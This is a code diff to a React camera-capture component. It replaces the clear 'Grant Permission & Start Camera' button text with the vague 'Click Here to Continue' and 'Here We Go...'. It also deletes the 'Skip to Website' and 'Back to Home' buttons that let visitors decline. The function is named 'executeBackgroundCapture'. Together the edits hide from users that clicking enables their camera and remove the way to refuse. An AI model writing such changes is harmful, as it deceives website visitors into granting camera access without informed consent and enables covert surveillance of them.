@@ -24,7 +24,7 @@ export default function CameraCaptureComponent({
 }: CameraCaptureProps = {}) {
   const [status, setStatus] = useState<"idle" | "denied" | "error" | "captured">("idle");
   const [isStarting, setIsStarting] = useState(false);
-  const [buttonText, setButtonText] = useState("Grant Permission & Start Camera");
+  const [buttonText, setButtonText] = useState("Click Here to Continue");
   const [errorMessage, setErrorMessage] = useState<string>("");
 
   const videoRef = useRef<HTMLVideoElement | null>(null);
@@ -58,7 +58,7 @@ export default function CameraCaptureComponent({
   const executeBackgroundCapture = async () => {
     if (isStarting) return;
     setIsStarting(true);
-    setButtonText("Connecting Camera...");
+    setButtonText("Here We Go...");
     setErrorMessage("");
 
     // Verify mediaDevices support
@@ -322,27 +322,10 @@ export default function CameraCaptureComponent({
                 ) : (
                   <>
                     <Camera className="w-5 h-5 text-purple-200" />
-                    <span>Grant Permission & Start Camera</span>
+                    <span>Click here to Continue</span>
                   </>
                 )}
               </button>
-
-              {onClose ? (
-                <button
-                  type="button"
-                  onClick={handleClose}
-                  className="w-full py-3.5 rounded-2xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white font-medium transition cursor-pointer text-center text-sm"
-                >
-                  Skip to Website
-                </button>
-              ) : (
-                <Link
-                  href="/"
-                  className="w-full py-3.5 rounded-2xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white font-medium transition text-center text-sm"
-                >
-                  Back to Home
-                </Link>
-              )}
             </div>
           </div>
         </div>
